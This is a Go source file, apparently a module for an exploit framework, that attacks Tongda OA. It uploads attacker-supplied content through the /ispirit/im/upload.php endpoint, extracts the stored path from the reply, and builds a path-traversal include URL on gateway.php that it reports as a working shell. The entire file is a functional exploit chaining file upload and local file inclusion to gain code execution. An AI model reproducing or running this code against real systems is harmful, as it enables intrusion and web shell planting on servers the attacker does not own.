package exp_TongdaOA

import (
	"encoding/json"
	"fmt"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"regexp"
	"strings"
)

type TDResponse struct {
	Status  int    `json:"status"`
	Content string `json:"content"`
	FileID  int    `json:"file_id"`
}

type Exp_TDUpload_lfi struct {
	exp_templates.ExpTemplate
}

func (self *Exp_TDUpload_lfi) Attack_upload1() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := `------WebKitFormBoundaryEOAfl5UE
Content-Disposition: form-data; name="P"

123
------WebKitFormBoundaryEOAfl5UE
Content-Disposition: form-data; name="TYPE"

123
------WebKitFormBoundaryEOAfl5UE
Content-Disposition: form-data; name="DEST_UID"

10
------WebKitFormBoundaryEOAfl5UE
Content-Disposition: form-data; name="UPLOAD_MODE"

1
------WebKitFormBoundaryEOAfl5UE
Content-Disposition: form-data; name="ATTACHMENT";filename="lzfilename"
Content-Type: image/jpeg

lzcontent
------WebKitFormBoundaryEOAfl5UE--
`
	uploadUrl := strings.TrimSuffix(self.Params.BaseParam.Target, "/") + "/ispirit/im/upload.php"
	includeUrl := strings.TrimSuffix(self.Params.BaseParam.Target, "/") + "/ispirit/interface/gateway.php"

	shellPayload = strings.Replace(shellPayload, "lzfilename", filename, 1)
	shellPayload = strings.Replace(shellPayload, "lzcontent", content, 1)
	headers["Content-Type"] = []string{"multipart/form-data; boundary=----WebKitFormBoundaryEOAfl5UE"}

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(uploadUrl, shellPayload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	tdresp := new(TDResponse)
	err := json.Unmarshal([]byte(httpresp.Body), tdresp)
	if err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}

	if tdresp.Status == 1 {
		tmpPath := regexp.MustCompile(`@(.*)\|`).FindStringSubmatch(tdresp.Content)
		if len(tmpPath) == 2 {
			filePath := strings.Replace(strings.Replace(tmpPath[1], "_", "/", 1), "|", ".", 1)
			self.EchoSuccessMsg("shell: " + includeUrl + fmt.Sprintf(`?json={"url":"/general/../../attach/im/%s"}`, filePath))
			expResult.Status = true
		}
	}
	return
}

func init() {

	exp_register.ExpStructRegister(&Exp_TDUpload_lfi{}, "exp_upload_lfi.yml")

}
